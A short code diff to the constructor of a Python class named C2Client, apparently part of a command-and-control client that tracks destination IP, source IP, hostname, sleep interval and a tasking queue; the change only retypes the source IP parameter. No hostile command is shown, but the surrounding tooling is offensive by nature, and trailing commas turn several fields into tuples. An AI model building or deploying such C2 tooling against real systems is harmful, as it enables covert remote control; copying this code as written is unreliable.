@@ -98,7 +98,7 @@ class C2Client:
             c2_method: str, 
             endpoint_id: uuid = None,
             sleep: int = 30,
-            src_ip: ip_address = get_ip_addr(),
+            src_ip: str = get_ip_addr(),
             hostname: str = socket.gethostname()
             ):
         self.dest_ip = dest_ip
@@ -106,7 +106,7 @@ class C2Client:
         self.c2_method = c2_method
         self.endpoint_id = endpoint_id
         self.sleep = sleep,
-        self.src_ip = str(src_ip),
+        self.src_ip = src_ip,
         self.hostname = hostname,
         self.tasking_queue = []
 
